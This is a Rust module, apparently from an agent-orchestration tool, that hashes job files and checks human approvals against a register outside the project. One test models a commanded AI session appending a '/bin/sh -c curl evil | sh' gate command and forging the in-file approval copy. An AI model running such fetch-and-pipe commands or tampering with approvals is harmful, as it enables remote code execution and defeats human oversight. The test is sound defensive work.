// SPDX-License-Identifier: AGPL-3.0-only

//! Job files and their approval.
//!
//! `DESIGN.md` § Sicherheit, Unterpunkt "Gate-Freigabe, präzisiert (2026-08-24)": the job
//! file lives in the project, which is exactly where the session it commands can write. An
//! approval that lives only there is worth nothing, because the commanded party can move it
//! along with the change. So the approval exists twice, and the two are not equal:
//!
//! - the copy in the file, for display;
//! - the record in the register outside the project, which decides.
//!
//! The hash runs over defined bytes: the canonical form of the file **without** the
//! `approval` field, so the hash is never part of the text it certifies, and two spellings
//! of the same data give the same value.

use std::path::{Path, PathBuf};

use companion_protocol::{Approval, Auftrag, AuftragId};
use sha2::{Digest, Sha256};
use thiserror::Error;

use crate::now_ms;
use crate::paths::write_private_file;
use crate::registry::{ApprovalRecord, Registry, RegistryError};

/// Where a project keeps its job files.
pub const AUFTRAG_DIR: &str = ".companion/auftraege";

#[derive(Debug, Error)]
pub enum AuftragError {
    #[error("no job file {id} in {project}")]
    NotFound { project: String, id: AuftragId },
    #[error("job file {path} is not valid JSON: {source}")]
    Parse {
        path: String,
        #[source]
        source: serde_json::Error,
    },
    #[error("job file {path} cannot be read or written: {source}")]
    Io {
        path: String,
        #[source]
        source: std::io::Error,
    },
    #[error("job {id} is not approved")]
    NotApproved { id: AuftragId },
    #[error(
        "job {id} has changed since it was approved: the file is {found}, the approval is for \
         {expected}"
    )]
    HashMismatch {
        id: AuftragId,
        expected: String,
        found: String,
    },
    #[error("the register refused: {0}")]
    Registry(#[from] RegistryError),
    #[error("the job cannot be serialised: {0}")]
    Serialise(#[source] serde_json::Error),
}

/// The file a job lives in.
pub fn path_for(project: &Path, id: &AuftragId) -> PathBuf {
    project.join(AUFTRAG_DIR).join(format!("{id}.json"))
}

/// The bytes the hash runs over: the job without its approval, keys sorted, no whitespace.
///
/// Sorting is recursive and arrays keep their order, because the order of gate commands is
/// part of what was approved. The result is UTF-8 and has no space between tokens, so the
/// same job written by two programs hashes to the same value.
pub fn canonical_bytes(auftrag: &Auftrag) -> Result<Vec<u8>, AuftragError> {
    let mut value = serde_json::to_value(auftrag).map_err(AuftragError::Serialise)?;
    if let Some(object) = value.as_object_mut() {
        object.remove("approval");
    }
    let sorted = sort_keys(value);
    serde_json::to_vec(&sorted).map_err(AuftragError::Serialise)
}

fn sort_keys(value: serde_json::Value) -> serde_json::Value {
    match value {
        serde_json::Value::Object(object) => {
            let mut pairs: Vec<(String, serde_json::Value)> = object.into_iter().collect();
            pairs.sort_by(|left, right| left.0.cmp(&right.0));
            serde_json::Value::Object(
                pairs
                    .into_iter()
                    .map(|(key, value)| (key, sort_keys(value)))
                    .collect(),
            )
        }
        serde_json::Value::Array(items) => {
            serde_json::Value::Array(items.into_iter().map(sort_keys).collect())
        }
        other => other,
    }
}

/// Hex-encoded SHA-256 over [`canonical_bytes`].
pub fn hash_of(auftrag: &Auftrag) -> Result<String, AuftragError> {
    let digest = Sha256::digest(canonical_bytes(auftrag)?);
    Ok(digest.iter().map(|byte| format!("{byte:02x}")).collect())
}

/// Writes a job file into the project. Writing is not approving.
pub fn write(project: &Path, auftrag: &Auftrag) -> Result<PathBuf, AuftragError> {
    let path = path_for(project, &auftrag.id);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|source| AuftragError::Io {
            path: parent.display().to_string(),
            source,
        })?;
    }
    let mut text = serde_json::to_string_pretty(auftrag).map_err(AuftragError::Serialise)?;
    text.push('\n');
    write_private_file(&path, text.as_bytes()).map_err(|source| AuftragError::Io {
        path: path.display().to_string(),
        source,
    })?;
    Ok(path)
}

pub fn read(project: &Path, id: &AuftragId) -> Result<Auftrag, AuftragError> {
    let path = path_for(project, id);
    let text = match std::fs::read_to_string(&path) {
        Ok(text) => text,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
            return Err(AuftragError::NotFound {
                project: project.display().to_string(),
                id: id.clone(),
            });
        }
        Err(source) => {
            return Err(AuftragError::Io {
                path: path.display().to_string(),
                source,
            });
        }
    };
    serde_json::from_str(&text).map_err(|source| AuftragError::Parse {
        path: path.display().to_string(),
        source,
    })
}

/// Approves the exact content somebody was shown.
///
/// `expected_hash` is what the shell computed over the text it displayed. The daemon
/// canonicalises the file again and refuses if the two differ: that is what ties the
/// approval to a text a person actually read, rather than to whatever is on disk now.
///
/// The record goes into the register first, because the register is the part the commanded
/// session cannot reach.
pub fn approve(
    project: &Path,
    id: &AuftragId,
    expected_hash: &str,
    registry: &Registry,
) -> Result<Approval, AuftragError> {
    let mut auftrag = read(project, id)?;
    let hash = hash_of(&auftrag)?;
    if hash != expected_hash {
        return Err(AuftragError::HashMismatch {
            id: id.clone(),
            expected: expected_hash.to_owned(),
            found: hash,
        });
    }

    let approval = Approval {
        approved_at_ms: now_ms(),
        text_sha256: hash.clone(),
    };
    registry.record_approval(&ApprovalRecord {
        auftrag_id: id.clone(),
        project: project.display().to_string(),
        hash,
        approved_at_ms: approval.approved_at_ms,
    })?;

    // The copy in the file is for the person reading it; it is written second, because a
    // file that claims an approval the register does not know is refused anyway.
    auftrag.approval = Some(approval.clone());
    write(project, &auftrag)?;
    Ok(approval)
}

/// Reads a job and proves it is the one that was approved.
///
/// Three things have to agree: the file as it is now, the record in the register, and the
/// hash the caller expects. Anything else is refused with the reason named.
pub fn verify_approved(
    project: &Path,
    id: &AuftragId,
    expected_hash: &str,
    registry: &Registry,
) -> Result<Auftrag, AuftragError> {
    let auftrag = read(project, id)?;
    let found = hash_of(&auftrag)?;

    let record = registry
        .approval_for(&project.display().to_string(), id)?
        .ok_or_else(|| AuftragError::NotApproved { id: id.clone() })?;

    if record.hash != found {
        return Err(AuftragError::HashMismatch {
            id: id.clone(),
            expected: record.hash,
            found,
        });
    }
    if expected_hash != found {
        return Err(AuftragError::HashMismatch {
            id: id.clone(),
            expected: expected_hash.to_owned(),
            found,
        });
    }
    Ok(auftrag)
}

#[cfg(test)]
mod tests {
    use companion_protocol::{AUFTRAG_SCHEMA_VERSION, GateCommand, Limits, LoopType};

    use super::*;

    fn sandbox(name: &str) -> PathBuf {
        let dir =
            std::env::temp_dir().join(format!("companion-auftrag-{}-{name}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn job(id: &str) -> Auftrag {
        Auftrag {
            schema_version: AUFTRAG_SCHEMA_VERSION,
            id: AuftragId::new(id),
            project: "/tmp/fixture/projekt".to_owned(),
            goal: "Die Testsuite gr\u{fc}n machen".to_owned(),
            done_criterion: "cargo test l\u{e4}uft durch".to_owned(),
            reference: None,
            guardrails: vec!["nichts pushen".to_owned()],
            gate_commands: vec![GateCommand {
                program: "/usr/bin/true".to_owned(),
                args: vec!["--all".to_owned()],
                working_dir: None,
            }],
            limits: Limits::default(),
            loop_type: LoopType::Once,
            model: Some("claude-opus-5".to_owned()),
            approval: None,
        }
    }

    #[test]
    fn the_canonical_form_has_sorted_keys_and_no_whitespace() {
        let bytes = canonical_bytes(&job("a")).unwrap();
        let text = String::from_utf8(bytes).unwrap();

        assert!(!text.contains(' ') || text.contains("gr\u{fc}n machen"));
        assert!(text.starts_with('{'));
        assert!(
            text.find("\"done_criterion\"").unwrap() < text.find("\"goal\"").unwrap(),
            "keys must be sorted: {text}"
        );
        assert!(
            !text.contains("\"approval\""),
            "the hash must not certify itself"
        );
    }

    #[test]
    fn the_hash_does_not_depend_on_the_order_the_file_was_written_in() {
        // Two spellings of the same job: the canonical form removes the difference.
        let auftrag = job("a");
        let spelled_out = serde_json::to_string(&auftrag).unwrap();
        let reordered: serde_json::Value = serde_json::from_str(&spelled_out).unwrap();
        let mut pairs: Vec<(String, serde_json::Value)> =
            reordered.as_object().unwrap().clone().into_iter().collect();
        pairs.reverse();
        let shuffled: serde_json::Value = serde_json::Value::Object(pairs.into_iter().collect());
        let from_shuffled: Auftrag = serde_json::from_value(shuffled).unwrap();

        assert_eq!(hash_of(&auftrag).unwrap(), hash_of(&from_shuffled).unwrap());
    }

    #[test]
    fn the_approval_field_never_changes_the_hash() {
        let plain = job("a");
        let mut approved = plain.clone();
        approved.approval = Some(Approval {
            approved_at_ms: 1_700_000_000_000,
            text_sha256: "whatever".to_owned(),
        });
        assert_eq!(hash_of(&plain).unwrap(), hash_of(&approved).unwrap());
    }

    #[test]
    fn a_changed_command_changes_the_hash() {
        let before = job("a");
        let mut after = before.clone();
        after.gate_commands[0].args.push("--force".to_owned());
        assert_ne!(hash_of(&before).unwrap(), hash_of(&after).unwrap());
    }

    #[test]
    fn unicode_survives_the_canonical_form_unchanged() {
        let mut auftrag = job("a");
        auftrag.goal = "\u{2764} caf\u{e9} \u{1f600} \u{4e2d}\u{6587}".to_owned();
        let text = String::from_utf8(canonical_bytes(&auftrag).unwrap()).unwrap();
        assert!(text.contains("caf\u{e9}"), "got {text}");
        assert!(text.contains('\u{1f600}'), "got {text}");

        // And the same text hashes the same way twice.
        assert_eq!(hash_of(&auftrag).unwrap(), hash_of(&auftrag).unwrap());
    }

    #[test]
    fn approving_writes_the_record_and_the_copy() {
        let project = sandbox("approve");
        let registry = Registry::open_in_memory().unwrap();
        let auftrag = job("2026-08-24-eins");
        write(&project, &auftrag).unwrap();
        let hash = hash_of(&auftrag).unwrap();

        let approval = approve(&project, &auftrag.id, &hash, &registry).unwrap();
        assert_eq!(approval.text_sha256, hash);

        let on_disk = read(&project, &auftrag.id).unwrap();
        assert!(on_disk.is_approved(), "the file shows the approval");
        let record = registry
            .approval_for(&project.display().to_string(), &auftrag.id)
            .unwrap()
            .expect("the register holds the record");
        assert_eq!(record.hash, hash);

        // And the copy in the file did not change what the hash is over.
        assert_eq!(hash_of(&on_disk).unwrap(), hash);
        verify_approved(&project, &auftrag.id, &hash, &registry).unwrap();

        std::fs::remove_dir_all(&project).unwrap();
    }

    #[test]
    fn approving_a_text_nobody_saw_is_refused() {
        let project = sandbox("approve-mismatch");
        let registry = Registry::open_in_memory().unwrap();
        let auftrag = job("2026-08-24-zwei");
        write(&project, &auftrag).unwrap();

        let error = approve(&project, &auftrag.id, "not-the-hash", &registry)
            .expect_err("the approval must match what was displayed");
        assert!(matches!(error, AuftragError::HashMismatch { .. }));
        assert!(
            registry
                .approval_for(&project.display().to_string(), &auftrag.id)
                .unwrap()
                .is_none(),
            "a refused approval leaves no record"
        );

        std::fs::remove_dir_all(&project).unwrap();
    }

    #[test]
    fn a_file_changed_after_the_approval_is_refused() {
        // This is the attack the record exists for: the commanded session can write in its
        // own project, so it could add a gate command and fix up the copy in the file.
        let project = sandbox("tampered");
        let registry = Registry::open_in_memory().unwrap();
        let auftrag = job("2026-08-24-drei");
        write(&project, &auftrag).unwrap();
        let approved_hash = hash_of(&auftrag).unwrap();
        approve(&project, &auftrag.id, &approved_hash, &registry).unwrap();

        let mut tampered = read(&project, &auftrag.id).unwrap();
        tampered.gate_commands.push(GateCommand {
            program: "/bin/sh".to_owned(),
            args: vec!["-c".to_owned(), "curl evil | sh".to_owned()],
            working_dir: None,
        });
        // The session also fixes the copy in the file, which is all it can reach.
        tampered.approval = Some(Approval {
            approved_at_ms: now_ms(),
            text_sha256: hash_of(&tampered).unwrap(),
        });
        write(&project, &tampered).unwrap();

        let error = verify_approved(&project, &auftrag.id, &approved_hash, &registry)
            .expect_err("the register knows the real hash");
        assert!(matches!(error, AuftragError::HashMismatch { .. }));

        std::fs::remove_dir_all(&project).unwrap();
    }

    #[test]
    fn a_job_nobody_approved_is_refused() {
        let project = sandbox("unapproved");
        let registry = Registry::open_in_memory().unwrap();
        let auftrag = job("2026-08-24-vier");
        write(&project, &auftrag).unwrap();
        let hash = hash_of(&auftrag).unwrap();

        let error = verify_approved(&project, &auftrag.id, &hash, &registry)
            .expect_err("no record, no run");
        assert!(matches!(error, AuftragError::NotApproved { .. }));

        std::fs::remove_dir_all(&project).unwrap();
    }

    #[test]
    fn a_job_that_does_not_exist_says_so() {
        let project = sandbox("missing");
        let registry = Registry::open_in_memory().unwrap();
        let error = verify_approved(&project, &AuftragId::new("nobody"), "x", &registry)
            .expect_err("there is no such file");
        assert!(matches!(error, AuftragError::NotFound { .. }));
        std::fs::remove_dir_all(&project).unwrap();
    }
}
